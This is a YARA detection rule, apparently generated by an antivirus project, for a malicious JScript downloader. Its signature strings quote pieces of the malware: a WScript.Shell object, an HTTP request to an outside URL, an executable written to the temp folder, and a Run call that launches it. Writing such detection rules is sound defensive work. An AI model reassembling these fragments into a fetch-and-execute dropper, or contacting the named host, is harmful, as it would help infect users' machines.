rule sig_20160330_24227332944208ebb437f02729d6db84 {
  meta:
    description = "datamaliciousorder - file 20160330_24227332944208ebb437f02729d6db84.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "91f03da7f046cc9bffb38f8363f0d467a6ca985fa14a3bbb4a3d1edba106e34c"

  strings:
    $s1  = "function I(BR, NM){P = P * 1; return BR - NM;};" fullword ascii
    $s2  = "var RH = function U() {return WScript[P0](\"WScript\"+\".Shell\");}(), IQ = 11;" fullword ascii
    $s3  = "S0[D](\"GET\", \"http://epegasus.pl/m2osa\", false);" fullword ascii
    $s4  = "if (S0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function ZG() {return RH[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"U8mcgH5LBga.ex\" + \"e\";};" fullword ascii
    $s6  = "function S(){return HZ + \"\";};" fullword ascii
    $s7  = "function V() {return ((Z0 == true) && (Z0 == LZ)) ? 1 : P;};" fullword ascii
    $s8  = "function SM(FD){RH[\"Run\"](FD, P, P);};" fullword ascii
    $s9  = "function L()" fullword ascii
    $s10 = "var N = new this[\"Date\"]();" fullword ascii
    $s11 = "function WF(){return P0;};" fullword ascii
    $s12 = "return I(II, W);" fullword ascii
    $s13 = "}while (Z);" fullword ascii
    $s14 = "function DX(){return 22;};" fullword ascii
    $s15 = "function NC(I0) {var YJ = (1, 2, 3, 4, 5, I0); return YJ;};" fullword ascii
    $s16 = "var Z0 = false;" fullword ascii
    $s17 = "Z0 = true; " fullword ascii
    $s18 = "var IW = false;" fullword ascii
    $s19 = "LZ = true; " fullword ascii
    $s20 = "var LZ = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}